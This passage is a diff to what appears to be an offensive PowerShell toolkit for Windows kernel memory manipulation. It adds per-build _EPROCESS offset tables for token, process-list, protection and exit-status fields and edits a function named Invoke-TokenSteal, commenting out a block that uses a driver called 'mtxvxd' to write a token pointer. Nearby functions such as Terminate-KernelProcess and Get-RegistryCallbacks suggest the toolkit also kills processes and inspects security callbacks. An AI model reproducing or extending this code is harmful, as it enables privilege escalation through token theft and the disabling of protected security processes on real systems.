@@ -4964,7 +4964,7 @@ Function ConvertFrom-EprocessStruct {
         [Int32]$ProtectionOffset             = $Global:ProtectedProcessOffset,
         [Int32]$ExitStatusOffset             = $Global:ExitStatusOffset,
         [Int32]$DirectoryTableBaseOffset     = 0x28,  # Embedded inside _KPROCESS (Pcb)
-        [Int32]$UserDirectoryTableBaseOffset = 0x388, # Embedded inside _KPROCESS (Pcb)
+        [Int32]$UserDirectoryTableBaseOffset = $Global:UserDirectoryTableBaseOffset,
         [switch]$IgnoreDirectoryTable,
         [switch]$IgnoreToken,
         [switch]$IgnoreExitStatus
@@ -5444,7 +5444,6 @@ Function Get-RegistryCallbacks {
     # 4. Walk the Doubly-Linked List
     $Iter = 0
     $MaxIter = 100
-    $CurrentLink = Read-VirtualAddress -VA ([IntPtr]$ListHeadAddr) -AsLong # Flink
     $CurrentLink = Read-VirtualAddress -VA([IntPtr]$ListHeadAddr) -AsLong
 
 
@@ -8241,6 +8240,7 @@ Function Query-EprocessStruct {
         [Int32]$ProcessID = 0
     )
     
+    $Global:Build         = [Environment]::OSVersion.Version.Build
     $Global:KernelAddress = Get-KernelBaseAddress
     $global:hModule       = Ldr-LoadDll -dwFlags SEARCH_SYS32 -dll ntoskrnl.exe
 
@@ -8250,31 +8250,39 @@ Function Query-EprocessStruct {
     # https://www.vergiliusproject.com/kernels/x64/windows-11/25h2/_EPROCESS
     # https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm
 
+    if ($null -eq $Global:UserDirectoryTableBaseOffset) {
+    $Global:UserDirectoryTableBaseOffset = switch ($true) {
+            ($Build -ge 26100) { 0x158; Break; }   # 24H2  (Germanium)
+            ($Build -ge 19041) { 0x388; Break; }   # 2004  23H2
+            ($Build -ge 18362) { 0x280; Break; }   # 1903, 1909
+            ($Build -ge 17134) { 0x278; Break; }   # 1803, 1809
+            default            { 0;     Break; }   # Pre-1803: field doesn't exist
+        }
+    }
+
     if ($null -eq $Global:TokenOffset) {
         $OS = [Environment]::OSVersion.Version
-        $Build = $OS.Build
 
-        # Match OS Major.Minor versions to your offset list
         $Global:TokenOffset = switch ($OS.Major) {
             5 { 
                 if ($OS.Minor -eq 2) { 0x0160 } else { 0x0160 } # Windows XP x64 / Server 2003
             }
             6 { 
                 switch ($OS.Minor) {
-                    0 { 0x0168 } # Windows Vista / Server 2008
-                    1 { 0x0208 } # Windows 7 / Server 2008 R2
-                    Default { 0x0348 } # Windows 8 (6.2) and Windows 8.1 (6.3)
+                    0 { 0x0168 }                                # Windows Vista / Server 2008
+                    1 { 0x0208 }                                # Windows 7 / Server 2008 R2
+                    Default { 0x0348 }                          # Windows 8 (6.2) and Windows 8.1 (6.3)
                 }
             }
             10 {
-                # Windows 10 & 11 branch based on Build Numbers
-                if ($Build -le 17763) { 0x0358 }     # 10.0 Base up to Redstone 5 (1809)
-                elseif ($Build -le 18363) { 0x0360 }   # 1903 and 1909
-                elseif ($Build -le 19045) { 0x04B8 }   # 20H1 up to Windows 10 22H2 / Early Win 11
-                elseif ($Build -ge 26100) { 0x0248 }   # Windows 11 24H2 and newer architecture
-                else { 0x04B8 }                        # Fallback case for interim 11 builds
+                                                                # Windows 10 & 11 branch based on Build Numbers
+                if ($Build -le 17763)     { 0x0358 }            # 10.0 Base up to Redstone 5 (1809)
+                elseif ($Build -le 18363) { 0x0360 }            # 1903 and 1909
+                elseif ($Build -le 19045) { 0x04B8 }            # 20H1 up to Windows 10 22H2 / Early Win 11
+                elseif ($Build -ge 26100) { 0x0248 }            # Windows 11 24H2 and newer architecture
+                else { 0x04B8 }                                 # Fallback case for interim 11 builds
             }
-            Default { 0x04B8 } # Ultimate fallback for modern kernels
+            Default { 0x04B8 }                                  # Ultimate fallback for modern kernels
         }
     }
 
@@ -8324,31 +8332,32 @@ Function Query-EprocessStruct {
         $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
         Free-NativeString -StringPtr $AnsiPtr
 
+        $UniqueProcessIdOffset = 0
+
         if ($ProcedureAddress -ne 0L) {
-            # Read the first 16 bytes of the function into a managed byte array
             $FuncBytes = New-Object Byte[] 16
             [Marshal]::Copy($ProcedureAddress, $FuncBytes, 0, 16)
 
-            $UniqueProcessIdOffset = 0
-        
-            # Scan for '48 8B 81' (mov rax, [rcx + offset]) or '48 8B 91' (mov rax, [rdx + offset])
             for ($i = 0; $i -lt 12; $i++) {
                 if ($FuncBytes[$i] -eq 0x48 -and $FuncBytes[$i+1] -eq 0x8B -and ($FuncBytes[$i+2] -eq 0x81 -or $FuncBytes[$i+2] -eq 0x91)) {
-                    # The 4-byte offset immediately follows the 3-byte opcode
                     $TargetAddress = [IntPtr]::Add($ProcedureAddress, $i + 3)
                     $UniqueProcessIdOffset = [Marshal]::ReadInt32($TargetAddress)
                     break
                 }
             }
+        }
 
-            if ($UniqueProcessIdOffset -gt 0) {
-                $Global:ActiveOffset = $UniqueProcessIdOffset + 0x08
-            } else {
-                # Fallback if pattern scan fails
-                $Global:ActiveOffset = 0x448
-            }
+        if ($UniqueProcessIdOffset -gt 0) {
+            $Global:ActiveOffset = $UniqueProcessIdOffset + 0x08
         } else {
-            $Global:ActiveOffset = 0x448
+            $Global:ActiveOffset = switch ($true) {
+                ($Build -ge 26100) { 0x1D8; break }
+                ($Build -ge 19041) { 0x448; break }
+                ($Build -ge 18362) { 0x2F0; break }
+                ($Build -ge 17134) { 0x2E8; break }
+                ($Build -ge 10240) { 0x2F0; break }
+                default            { 0x448 }
+            }
         }
     }
 
@@ -8364,16 +8373,25 @@ Function Query-EprocessStruct {
             if ($FuncBytes[0] -eq 0x48 -and $FuncBytes[1] -eq 0x8B -and $FuncBytes[2] -eq 0x81) {
                 $Global:PEBOffset = [System.BitConverter]::ToUInt32($FuncBytes, 3)
             } else {
-                $Global:PEBOffset = 0x550
+                # PEBOffset fallback
+                $Global:PEBOffset = switch ($true) {
+                    ($Build -ge 26100) { 0x2E0; break }
+                    ($Build -ge 19041) { 0x550; break }
+                    default            { 0x3F8 }
+                }
             }
         
         } else {
-            # Fallback if the export can't be resolved
-            $Global:PEBOffset = 0x550
+            # PEBOffset fallback
+            $Global:PEBOffset = switch ($true) {
+                ($Build -ge 26100) { 0x2E0; break }
+                ($Build -ge 19041) { 0x550; break }
+                default            { 0x3F8 }
+            }
         }
     }
 
-    if ($null -eq $Global:ThreadListHeadOffset) {
+    if ($null -eq $Global:PreviousModeOffset) {
         $ProcedureAddress = [IntPtr]::Zero
         $AnsiPtr = Init-NativeString -Value 'ExGetPreviousMode' -Encoding Ansi
         $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
@@ -8424,11 +8442,30 @@ Function Query-EprocessStruct {
     }
 
     if ($null -eq $Global:ThreadListHeadOffset) {
+        $Global:ThreadListHeadOffset = switch ($true) {
+            ($Build -ge 26100) { 0x370; break }   # 24H2
+            ($Build -ge 19041) { 0x5E0; break }   # 2004 - 23H2
+            ($Build -ge 18362) { 0x488; break }   # 1903, 1909
+            ($Build -ge 17134) { 0x488; break }   # 1803, 1809
+            ($Build -ge 14393) { 0x488; break }   # 1607, 1709
+            ($Build -ge 10240) { 0x480; break }   # 1507
+        }
+    }
+
+    if ($null -eq $Global:ThreadListHeadOffset) {
         if ($Global:ActiveOffset -gt 0) {
-            # Calculate relative to the dynamically found ActiveProcessLinks offset
-            $Global:ThreadListHeadOffset = $Global:ActiveOffset + 0x198
+            $Gap = switch ($true) {
+                ($Build -ge 14393 -and $Build -lt 17134) { 0x198; break }
+                ($Build -ge 17134 -and $Build -lt 18362) { 0x1A0; break }
+                ($Build -ge 18362)                       { 0x198; break }
+                default                                  { 0 }
+            }
+            if ($Gap) {
+                $Global:ThreadListHeadOffset = $Global:ActiveOffset + $Gap
+            } else {
+                $Global:ThreadListHeadOffset = 0x5E0
+            }
         } else {
-            # Architectural fallback matching your IDA dump structure
             $Global:ThreadListHeadOffset = 0x5E0
         }
     }
@@ -8459,7 +8496,16 @@ Function Query-EprocessStruct {
 
         # Absolute fallback if pattern scanning fails on an abnormal build
         if ($null -eq $Global:ProtectedProcessOffset -or $Global:ProtectedProcessOffset -eq 0) {
-            $Global:ProtectedProcessOffset = 0x87A  # Modern Windows 11 default
+            # ProtectedProcessOffset fallback
+            $Global:ProtectedProcessOffset = switch ($true) {
+                ($Build -ge 26100) { 0x5FA; break }
+                ($Build -ge 19041) { 0x87A; break }
+                ($Build -ge 18362) { 0x6FA; break }
+                ($Build -ge 17134) { 0x6CA; break }
+                ($Build -ge 14393) { 0x6C2; break }
+                ($Build -ge 10240) { 0x6AA; break }
+                default            { 0x87A }
+            }
         }
     }
 
@@ -8487,7 +8533,16 @@ Function Query-EprocessStruct {
 
         # Absolute fallback if pattern scanning fails (Matches your IDA dump)
         if ($null -eq $Global:ExitStatusOffset -or $Global:ExitStatusOffset -eq 0) {
-            $Global:ExitStatusOffset = 0x7D4  
+            # ExitStatusOffset fallback
+            $Global:ExitStatusOffset = switch ($true) {
+                ($Build -ge 26100) { 0x554; break }
+                ($Build -ge 19041) { 0x7D4; break }
+                ($Build -ge 18362) { 0x654; break }
+                ($Build -ge 17134) { 0x624; break }
+                ($Build -ge 14393) { 0x61C; break }
+                ($Build -ge 10240) { 0x604; break }
+                default            { 0x7D4 }
+            }
         }
     }
 
@@ -8516,7 +8571,14 @@ Function Query-EprocessStruct {
 
         # Absolute fallback handling
         if ($null -eq $Global:ImageFileNameOffset -or $Global:ImageFileNameOffset -eq 0) {
-            $Global:ImageFileNameOffset = if ([Environment]::OSVersion.Version.Build -ge 22000) { 0x6A8 } else { 0x5A8 }
+            # ImageFileNameOffset fallback
+            $Global:ImageFileNameOffset = switch ($true) {
+                ($Build -ge 26100) { 0x338; break }
+                ($Build -ge 19041) { 0x5A8; break }
+                ($Build -ge 14393) { 0x450; break }
+                ($Build -ge 10240) { 0x448; break }
+                default            { 0x5A8 }
+            }
         }
     }
 
@@ -8663,7 +8725,7 @@ function Invoke-TokenSteal {
             -Value ([System.BitConverter]::GetBytes([Int64]$CleanedTokenInt))
     return $status
 
-    # 4. Use the driver to map memory and write the pointer
+    <#
     $va = Map-VirtualAddress -VA $TokenHandle -DriverName mtxvxd -BlockSize 8
     if ($null -ne $va -and $va -ne 0L) {
         [marshal]::WriteInt64($va, $CleanedTokenInt)
@@ -8672,6 +8734,7 @@ function Invoke-TokenSteal {
     } else {
         Write-Error "Failed to map virtual address via the driver."
     }
+    #>
 }
 function Terminate-KernelProcess {
     [CmdletBinding()]
